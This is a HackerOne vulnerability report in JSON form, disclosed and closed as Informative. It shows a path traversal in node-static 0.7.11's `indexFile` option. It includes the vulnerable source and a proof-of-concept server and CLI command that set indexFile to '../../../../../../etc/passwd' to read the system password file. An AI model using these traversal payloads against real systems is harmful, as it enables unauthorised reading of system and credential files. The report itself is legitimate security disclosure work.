{"id":677955,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82Nzc5NTU=","url":"https://hackerone.com/reports/677955","title":"`indexFile` option passed as an argument to node-server can lead to arbitrary file read","state":"Closed","substate":"informative","severity_rating":"low","readable_substate":"Informative","created_at":"2019-08-20T22:16:11.091Z","submitted_at":"2019-08-20T22:16:11.091Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bl4de","url":"/bl4de","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-12-04T19:42:26.136Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-12-04T19:42:19.008Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi Guys,\n\nI would like to report Path Traversal vulnerability in `indexFile` parameter passed as an option to`node-server`.\nThis vulnerability affects both CLI `--indexFile` and `options.indexFile` passed as an argument to `Server.prototype.serveDir` function in `node-static.js`\n\n# Module\n\n**module name:** node-static\n**version:** 0.7.11\n**npm page:** `https://www.npmjs.com/package/node-static`\n\n## Module Description\n\na simple, rfc 2616 compliant file streaming module for node\n\nnode-static understands and supports conditional GET and HEAD requests. node-static was inspired by some of the other static-file serving modules out there, such as node-paperboy and antinode.\n\n## Module Stats\n\n**~38.000 downloads/week**\n**\u003e150.000 downloads/month**\n\n# Vulnerability\n\n`node-static` allows to run static HTTP server with several options available. One of those options is `indexFile`, which allows to point to a specific file served as direcory index when user opens default url where server runs.\n\nBecause `node-static` does not restrict what file and from which location can be used as directory index, any of the files available on the machine where `node-static` is running can be used.\n\nIf `indexFile` option can be somehow controlled by malicious user, this can lead to arbitrary file read.\n\n\n## Vulnerability Description\n\nVulnerability exists, because `indexFile` argument passed as one of the options to `Server.prototype.serveDir` function is not checked against Path Traversal patterns and allows to inject any path. When server is running, HTTP request to server root causes content of the file passed in `indexFile` is returned.\n\nThis works both for server run as standalone Node.js application and when server is run from CLI.\n\nHere's vulnerable fragment of the code:\n\n```javascript\n// node-static/lib/node-static.js; lines from 52:\n\nServer.prototype.serveDir = function (pathname, req, res, finish) {\n    var htmlIndex = path.join(pathname, this.options.indexFile),   //// \u003c-- this.options.indexFile passed \"as is\"\n        that = this;\n\n    fs.stat(htmlIndex, function (e, stat) {\n        if (!e) {\n            var status = 200;\n            var headers = {};\n            var originalPathname = decodeURI(url.parse(req.url).pathname);\n            if (originalPathname.length \u0026\u0026 originalPathname.charAt(originalPathname.length - 1) !== '/') {\n                return finish(301, { 'Location': originalPathname + '/' });\n            } else {\n                that.respond(null, status, headers, [htmlIndex], stat, req, res, finish);\n            }\n        } else {\n            // Stream a directory of files as a single file.\n            fs.readFile(path.join(pathname, 'index.json'), function (e, contents) {\n                if (e) { return finish(404, {}) }\n                var index = JSON.parse(contents);\n                streamFiles(index.files);\n            });\n        }\n    });\n    function streamFiles(files) {\n        util.mstat(pathname, files, function (e, stat) {\n            if (e) { return finish(404, {}) }\n            that.respond(pathname, 200, {}, files, stat, req, res, finish);\n        });\n    }\n};\n\n```\n\nHere's sample Node.js application using `node-static` as HTTP server, with `indexFile` option set to arbitrary file:\n\n```javascript\n'use strict'\n\nconst s = require('node-static');\n\nconst options = {\n    indexFile: '../../../../../../../etc/passwd'\n};\n\nconst file = new s.Server('./', options);\n\nrequire('http').createServer(function (request, response) {\n    request.addListener('end', function () {\n        //\n        // Serve files!\n        //\n        file.serve(request, response);\n    }).resume();\n}).listen(8080);\n```\n\nWhen it's run and `http://127.0.0.1:8080` ur is accessed in the browser, file is being downloaded:\n\n{F560591}\n\nThe content of the downloaded file:\n\n{F560592}\n\n\nWe can get the same result when `node-static` server is run from CLI:\n\n{F560593}\n\n\nThis time, server was created with following command:\n\n```\n$ ./node_modules/node-static/bin/cli.js --indexFile ../../../../../../etc/passwd\n```\n\n\n\n## Steps To Reproduce:\n\n- install `node-static` with `npm i node-static` command\n- in the folder with `./node_modules`, run following command (on Linux or macOS):\n\n```\n$ ./node_modules/node-static/bin/cli.js --indexFile ../../../../../../etc/passwd\n```\n\n- ensure you put enough `../` sequences to reach root folder (`/`) on your machine, depending on how deep your `node_modules` folder is located\n- with browser of your choice, navigate to `http://127.0.0.1:8080`. Browser should start downloading `/etc/passwd` file.\n\n\n\n## Supporting Material/References:\n\nThis vulnerability was found and verified with following configuration:\n\n- macOS 10.14.6\n- Node 10.16.0\n- npm 6.9.0\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nStay Safe,\n\nbl4de\n\n## Impact\n\nArbitrary File Read","vulnerability_information_html":"\u003cp\u003eHi Guys,\u003c/p\u003e\n\n\u003cp\u003eI would like to report Path Traversal vulnerability in \u003ccode\u003eindexFile\u003c/code\u003e parameter passed as an option to\u003ccode\u003enode-server\u003c/code\u003e.\u003cbr\u003e\nThis vulnerability affects both CLI \u003ccode\u003e--indexFile\u003c/code\u003e and \u003ccode\u003eoptions.indexFile\u003c/code\u003e passed as an argument to \u003ccode\u003eServer.prototype.serveDir\u003c/code\u003e function in \u003ccode\u003enode-static.js\u003c/code\u003e\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e node-static\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 0.7.11\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/node-static\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cp\u003ea simple, rfc 2616 compliant file streaming module for node\u003c/p\u003e\n\n\u003cp\u003enode-static understands and supports conditional GET and HEAD requests. node-static was inspired by some of the other static-file serving modules out there, such as node-paperboy and antinode.\u003c/p\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e\u003cstrong\u003e~38.000 downloads/week\u003c/strong\u003e\u003cbr\u003e\n\u003cstrong\u003e\u0026gt;150.000 downloads/month\u003c/strong\u003e\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003cp\u003e\u003ccode\u003enode-static\u003c/code\u003e allows to run static HTTP server with several options available. One of those options is \u003ccode\u003eindexFile\u003c/code\u003e, which allows to point to a specific file served as direcory index when user opens default url where server runs.\u003c/p\u003e\n\n\u003cp\u003eBecause \u003ccode\u003enode-static\u003c/code\u003e does not restrict what file and from which location can be used as directory index, any of the files available on the machine where \u003ccode\u003enode-static\u003c/code\u003e is running can be used.\u003c/p\u003e\n\n\u003cp\u003eIf \u003ccode\u003eindexFile\u003c/code\u003e option can be somehow controlled by malicious user, this can lead to arbitrary file read.\u003c/p\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003eVulnerability exists, because \u003ccode\u003eindexFile\u003c/code\u003e argument passed as one of the options to \u003ccode\u003eServer.prototype.serveDir\u003c/code\u003e function is not checked against Path Traversal patterns and allows to inject any path. When server is running, HTTP request to server root causes content of the file passed in \u003ccode\u003eindexFile\u003c/code\u003e is returned.\u003c/p\u003e\n\n\u003cp\u003eThis works both for server run as standalone Node.js application and when server is run from CLI.\u003c/p\u003e\n\n\u003cp\u003eHere\u0026#39;s vulnerable fragment of the code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e// node-static/lib/node-static.js; lines from 52:\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003eServer\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eprototype\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eserveDir\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epathname\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eres\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003efinish\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ehtmlIndex\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epathname\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eoptions\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eindexFile\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e   \u003cspan class=\"c1\"\u003e//// \u0026lt;-- this.options.indexFile passed \u0026quot;as is\u0026quot;\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ethat\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003efs\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ehtmlIndex\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003estat\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003estatus\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e200\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eheaders\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{};\u003c/span\u003e\n            \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eoriginalPathname\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003edecodeURI\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003epathname\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eoriginalPathname\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003eoriginalPathname\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003echarAt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eoriginalPathname\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e!==\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003efinish\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e301\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eLocation\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eoriginalPathname\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"nx\"\u003ethat\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erespond\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003estatus\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eheaders\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ehtmlIndex\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"nx\"\u003estat\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eres\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003efinish\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"c1\"\u003e// Stream a directory of files as a single file.\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003efs\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereadFile\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epathname\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eindex.json\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003econtents\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003efinish\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e404\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{})\u003c/span\u003e \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n                \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eindex\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003econtents\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"nx\"\u003estreamFiles\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eindex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003efiles\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003estreamFiles\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003efiles\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eutil\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emstat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epathname\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003efiles\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003estat\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003efinish\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e404\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{})\u003c/span\u003e \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003ethat\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erespond\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epathname\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e200\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{},\u003c/span\u003e \u003cspan class=\"nx\"\u003efiles\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003estat\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eres\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003efinish\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHere\u0026#39;s sample Node.js application using \u003ccode\u003enode-static\u003c/code\u003e as HTTP server, with \u003ccode\u003eindexFile\u003c/code\u003e option set to arbitrary file:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003euse strict\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003enode-static\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003eoptions\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"na\"\u003eindexFile\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e../../../../../../../etc/passwd\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003efile\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eServer\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e./\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eoptions\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ehttp\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003ecreateServer\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddListener\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eend\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"c1\"\u003e//\u003c/span\u003e\n        \u003cspan class=\"c1\"\u003e// Serve files!\u003c/span\u003e\n        \u003cspan class=\"c1\"\u003e//\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003efile\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eserve\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}).\u003c/span\u003e\u003cspan class=\"nx\"\u003eresume\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}).\u003c/span\u003e\u003cspan class=\"nx\"\u003elisten\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e8080\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhen it\u0026#39;s run and \u003ccode\u003ehttp://127.0.0.1:8080\u003c/code\u003e ur is accessed in the browser, file is being downloaded:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"2.png\" 